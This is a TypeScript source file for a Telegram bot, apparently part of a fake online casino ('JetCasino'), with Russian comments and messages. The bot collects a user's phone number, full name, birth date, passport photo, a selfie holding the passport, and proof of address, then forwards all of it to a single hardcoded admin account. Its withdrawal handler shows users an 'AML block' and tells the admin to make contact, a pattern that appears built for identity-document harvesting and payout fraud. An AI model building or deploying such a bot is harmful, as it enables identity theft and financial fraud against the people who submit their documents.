// ═══════════════════════════════════════════════════
// JetCasino — Verification Bot (@Verification_CasinoBoom_bot)
// Полный KYC: телефон → ФИО → дата рождения → паспорт → селфи → адрес
// ═══════════════════════════════════════════════════

import { serve } from "https://deno.land/std@0.177.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const SUPABASE_URL         = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const BOT_TOKEN            = Deno.env.get("VERIFICATION_BOT_TOKEN")!;
const ADMIN_TG_ID          = Deno.env.get("ADMIN_TG_ID") || "8324018832";
const CASINO_URL           = "https://bestcop0-pixel.github.io/casino/";
const WELCOME_BONUS        = 500;

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

const cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
};

function json(data: unknown, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...cors, "Content-Type": "application/json" },
  });
}

async function tg(method: string, body: Record<string, unknown> = {}) {
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json; charset=utf-8" },
    body: JSON.stringify(body),
  });
  return r.json();
}

// Определяем текущий шаг верификации по данным в БД
function getKycStep(user: Record<string, any>): number {
  if (!user.phone)              return 1; // нужен телефон
  if (!user.kyc_full_name)      return 2; // нужно ФИО
  if (!user.kyc_dob)            return 3; // нужна дата рождения
  if (!user.kyc_passport)       return 4; // нужен паспорт
  if (!user.kyc_selfie)         return 5; // нужно селфи с паспортом
  if (!user.kyc_address_proof)  return 6; // нужно подтверждение адреса
  return 7; // всё готово
}

async function askNextStep(chatId: number, step: number) {
  const steps: Record<number, () => Promise<void>> = {
    2: () => tg("sendMessage", {
      chat_id: chatId,
      text: `✅ Телефон подтверждён!\n\n📝 *Шаг 2 из 6* — Введите ваши ФИО\n\nФормат: Иванов Иван Иванович`,
      parse_mode: "Markdown",
      reply_markup: { remove_keyboard: true },
    }),
    3: () => tg("sendMessage", {
      chat_id: chatId,
      text: `✅ ФИО сохранено!\n\n📅 *Шаг 3 из 6* — Введите дату рождения\n\nФормат: 01.01.1990`,
      parse_mode: "Markdown",
    }),
    4: () => tg("sendMessage", {
      chat_id: chatId,
      text: `✅ Дата рождения принята!\n\n🪪 *Шаг 4 из 6* — Отправьте фото паспорта\n\nФотография главного разворота (страница с фото и данными). Убедитесь что текст чётко читается.`,
      parse_mode: "Markdown",
    }),
    5: () => tg("sendMessage", {
      chat_id: chatId,
      text: `✅ Паспорт получен!\n\n🤳 *Шаг 5 из 6* — Селфи с паспортом\n\nСфотографируйтесь держа паспорт рядом с лицом. Лицо и данные паспорта должны быть видны.`,
      parse_mode: "Markdown",
    }),
    6: () => tg("sendMessage", {
      chat_id: chatId,
      text: `✅ Селфи принято!\n\n🏠 *Шаг 6 из 6* — Подтверждение адреса проживания\n\nОтправьте фото любого документа с вашим адресом:\n• Квитанция ЖКХ\n• Выписка из банка\n• Договор аренды\n\nДокумент должен быть не старше 3 месяцев.`,
      parse_mode: "Markdown",
    }),
  };
  if (steps[step]) await steps[step]();
}

// Отправить все документы админу когда KYC завершён
async function notifyAdminComplete(user: Record<string, any>) {
  const uname = user.tg_username ? `@${user.tg_username}` : "без username";

  // Текстовое резюме
  await tg("sendMessage", {
    chat_id: ADMIN_TG_ID,
    text:
      `🔔 *Новая верификация KYC завершена!*\n\n` +
      `👤 ${user.tg_first_name} (${uname})\n` +
      `🆔 TG ID: \`${user.tg_id}\`\n` +
      `📱 Телефон: \`${user.phone}\`\n` +
      `📝 ФИО: ${user.kyc_full_name}\n` +
      `📅 Дата рождения: ${user.kyc_dob}\n\n` +
      `Документы ниже 👇\n\nВыдать бонус $${WELCOME_BONUS}?`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: `💵 Выдать $${WELCOME_BONUS}`, callback_data: `grant_bonus:${user.id}` },
        { text: "❌ Пропустить",              callback_data: `skip_bonus:${user.id}` },
      ]],
    },
  });

  // Паспорт
  await tg("sendPhoto", {
    chat_id: ADMIN_TG_ID,
    photo: user.kyc_passport,
    caption: `🪪 Паспорт — ${user.kyc_full_name}`,
  });

  // Селфи
  await tg("sendPhoto", {
    chat_id: ADMIN_TG_ID,
    photo: user.kyc_selfie,
    caption: `🤳 Селфи с паспортом`,
  });

  // Адрес
  await tg("sendPhoto", {
    chat_id: ADMIN_TG_ID,
    photo: user.kyc_address_proof,
    caption: `🏠 Подтверждение адреса`,
  });
}

// ═══ WEBHOOK ═══
async function handleWebhook(req: Request) {
  const update = await req.json();

  // ── Callback (admin нажал кнопку) ──
  if (update.callback_query) {
    const cb   = update.callback_query;
    const data = cb.data || "";

    if (data.startsWith("grant_bonus:")) {
      const userId = data.split(":")[1];

      const { data: balResult, error: balErr } = await supabase.rpc("change_balance", {
        p_user_id: userId,
        p_delta: WELCOME_BONUS,
        p_type: "deposit",
        p_meta: { source: "kyc_bonus", admin_granted: true },
      });

      if (balErr) {
        await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "❌ Ошибка: " + balErr.message, show_alert: true });
        return json({ ok: true });
      }

      const newBalance = parseFloat(balResult?.[0]?.new_balance || "500").toFixed(2);
      await supabase.from("users").update({ welcome_bonus_claimed: true }).eq("id", userId);

      const { data: user } = await supabase.from("users").select("tg_id, tg_first_name").eq("id", userId).single();
      if (user?.tg_id) {
        await tg("sendMessage", {
          chat_id: user.tg_id,
          text: `🎉 *Верификация пройдена!*\n\n✅ Все документы проверены.\n💵 *+${WELCOME_BONUS} USDT* зачислено на счёт.\n💰 Баланс: *${newBalance} USDT*\n\nОткройте казино через @CasinoBoom1_bot 🎰`,
          parse_mode: "Markdown",
        });
      }

      await tg("editMessageReplyMarkup", {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await tg("answerCallbackQuery", { callback_query_id: cb.id, text: `✅ $${WELCOME_BONUS} выдано!`, show_alert: true });
      await tg("sendMessage", { chat_id: ADMIN_TG_ID, text: `✅ $${WELCOME_BONUS} выдано игроку ${user?.tg_first_name || ""}. Баланс: ${newBalance} USDT` });
    }

    if (data.startsWith("skip_bonus:")) {
      await tg("editMessageReplyMarkup", {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [] },
      });
      await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Пропущено" });
    }

    return json({ ok: true });
  }

  const msg = update.message;
  if (!msg) return json({ ok: true });

  const chatId    = msg.chat.id;
  const tgId      = msg.from.id;
  const firstName = msg.from.first_name || "Игрок";
  const text      = (msg.text || "").trim();

  // ── /start ──
  if (text === "/start" || text.startsWith("/start ")) {
    const { data: existingUser } = await supabase
      .from("users")
      .select("phone, kyc_full_name, kyc_dob, kyc_passport, kyc_selfie, kyc_address_proof, balance, welcome_bonus_claimed")
      .eq("tg_id", tgId)
      .single();

    if (existingUser) {
      const step = getKycStep(existingUser);
      if (step === 7) {
        await tg("sendMessage", {
          chat_id: chatId,
          text: `✅ *${firstName}, вы уже верифицированы!*\n\n💰 Баланс: *${parseFloat(existingUser.balance).toFixed(2)} USDT*\n\nОткройте казино через @CasinoBoom1_bot`,
          parse_mode: "Markdown",
        });
        return json({ ok: true });
      }
      // Продолжаем с того шага где остановились
      if (step > 1) {
        await tg("sendMessage", { chat_id: chatId, text: `👋 Продолжаем верификацию с шага ${step - 1}...` });
        await askNextStep(chatId, step);
        return json({ ok: true });
      }
    }

    // Шаг 1 — запрос телефона
    await tg("sendMessage", {
      chat_id: chatId,
      text:
        `🎰 *Добро пожаловать, ${firstName}!*\n\n` +
        `Для вывода средств необходимо пройти верификацию KYC.\n\n` +
        `📋 *Что потребуется:*\n` +
        `📱 Номер телефона\n` +
        `📝 ФИО\n` +
        `📅 Дата рождения\n` +
        `🪪 Фото паспорта\n` +
        `🤳 Селфи с паспортом\n` +
        `🏠 Подтверждение адреса\n\n` +
        `*Шаг 1 из 6* — Нажмите кнопку ниже 👇`,
      parse_mode: "Markdown",
      reply_markup: {
        keyboard: [[{ text: "📱 Поделиться номером", request_contact: true }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });
    return json({ ok: true });
  }

  // ── Телефон (шаг 1) ──
  if (msg.contact) {
    if (msg.contact.user_id && msg.contact.user_id !== tgId) {
      await tg("sendMessage", { chat_id: chatId, text: "❌ Поделитесь своим собственным номером." });
      return json({ ok: true });
    }

    const phone = msg.contact.phone_number;

    const { data: user, error } = await supabase
      .from("users")
      .upsert({
        tg_id: tgId,
        tg_username: msg.from.username || null,
        tg_first_name: firstName,
        phone,
        last_active: new Date().toISOString(),
      }, { onConflict: "tg_id" })
      .select()
      .single();

    if (error || !user) {
      await tg("sendMessage", { chat_id: chatId, text: "❌ Ошибка сервера. Попробуйте позже." });
      return json({ ok: true });
    }

    await askNextStep(chatId, 2);
    return json({ ok: true });
  }

  // ── Фото (шаги 4, 5, 6) ──
  if (msg.photo) {
    const fileId = msg.photo[msg.photo.length - 1].file_id;

    const { data: user } = await supabase
      .from("users")
      .select("id, tg_id, tg_username, tg_first_name, phone, kyc_full_name, kyc_dob, kyc_passport, kyc_selfie, kyc_address_proof")
      .eq("tg_id", tgId)
      .single();

    if (!user || !user.phone) {
      await tg("sendMessage", { chat_id: chatId, text: "Сначала поделитесь номером телефона. Нажмите /start" });
      return json({ ok: true });
    }

    const step = getKycStep(user);

    if (step === 4) {
      await supabase.from("users").update({ kyc_passport: fileId }).eq("tg_id", tgId);
      await askNextStep(chatId, 5);
    } else if (step === 5) {
      await supabase.from("users").update({ kyc_selfie: fileId }).eq("tg_id", tgId);
      await askNextStep(chatId, 6);
    } else if (step === 6) {
      await supabase.from("users").update({ kyc_address_proof: fileId }).eq("tg_id", tgId);

      await tg("sendMessage", {
        chat_id: chatId,
        text: `✅ *Документы получены!*\n\nВаша заявка на верификацию отправлена на проверку.\n\n⏱ Обычно это занимает до *24 часов*.\n\nПо результатам вы получите уведомление здесь.`,
        parse_mode: "Markdown",
        reply_markup: { remove_keyboard: true },
      });

      // Получаем полные данные и уведомляем админа
      const { data: fullUser } = await supabase.from("users").select("*").eq("tg_id", tgId).single();
      if (fullUser) await notifyAdminComplete(fullUser);
    } else {
      await tg("sendMessage", { chat_id: chatId, text: "Сейчас не ожидается фото. Введите текстовые данные." });
    }
    return json({ ok: true });
  }

  // ── Текст (шаги 2, 3 — ФИО и дата рождения) ──
  if (text && !text.startsWith("/")) {
    const { data: user } = await supabase
      .from("users")
      .select("id, phone, kyc_full_name, kyc_dob, kyc_passport, kyc_selfie, kyc_address_proof")
      .eq("tg_id", tgId)
      .single();

    if (!user || !user.phone) {
      await tg("sendMessage", {
        chat_id: chatId,
        text: "📱 Сначала поделитесь номером телефона:",
        reply_markup: {
          keyboard: [[{ text: "📱 Поделиться номером", request_contact: true }]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
      return json({ ok: true });
    }

    const step = getKycStep(user);

    if (step === 2) {
      // Валидация ФИО — минимум 2 слова
      const words = text.split(/\s+/).filter(Boolean);
      if (words.length < 2) {
        await tg("sendMessage", { chat_id: chatId, text: "❌ Введите полное ФИО (минимум имя и фамилия).\nПример: Иванов Иван Иванович" });
        return json({ ok: true });
      }
      await supabase.from("users").update({ kyc_full_name: text }).eq("tg_id", tgId);
      await askNextStep(chatId, 3);
    } else if (step === 3) {
      // Валидация даты — формат DD.MM.YYYY
      if (!/^\d{2}\.\d{2}\.\d{4}$/.test(text)) {
        await tg("sendMessage", { chat_id: chatId, text: "❌ Неверный формат. Введите дату рождения в формате:\n01.01.1990" });
        return json({ ok: true });
      }
      await supabase.from("users").update({ kyc_dob: text }).eq("tg_id", tgId);
      await askNextStep(chatId, 4);
    } else if (step >= 4) {
      await tg("sendMessage", { chat_id: chatId, text: "📸 Ожидается фото документа. Отправьте фотографию." });
    }
    return json({ ok: true });
  }

  return json({ ok: true });
}

// ═══ NOTIFY ADMIN (withdraw attempt) ═══
async function handleNotifyAdmin(req: Request) {
  const { tg_id, first_name, username, wallet, amount } = await req.json();
  const uname = username ? `@${username}` : "нет username";
  await tg("sendMessage", {
    chat_id: ADMIN_TG_ID,
    text: `💸 *Заявка на вывод*\n\n👤 ${first_name || "—"} (${uname})\n🆔 TG ID: \`${tg_id || "—"}\`\n💳 Кошелёк: \`${wallet || "—"}\`\n💵 Сумма: *${amount || "—"} USDT*\n\n⚠️ Показан AML-блок. Ожидайте контакта.`,
    parse_mode: "Markdown",
  });
  return json({ ok: true });
}

// ═══ SET WEBHOOK ═══
async function setWebhook() {
  const webhookUrl = `${SUPABASE_URL}/functions/v1/verification-bot/webhook`;
  const result = await tg("setWebhook", {
    url: webhookUrl,
    allowed_updates: ["message", "callback_query"],
  });
  await tg("setMyCommands", {
    commands: [{ command: "start", description: "Начать верификацию KYC" }],
  });
  return json({ ok: true, webhook: webhookUrl, result });
}

// ═══ MAIN ROUTER ═══
serve(async (req: Request) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: cors });
  const path = new URL(req.url).pathname.split("/verification-bot").pop() || "/";
  try {
    if (path === "/webhook")      return await handleWebhook(req);
    if (path === "/set-webhook")  return await setWebhook();
    if (path === "/notify-admin") return await handleNotifyAdmin(req);
    return json({ error: "Not found" }, 404);
  } catch (e: any) {
    return json({ error: e.message }, 500);
  }
});
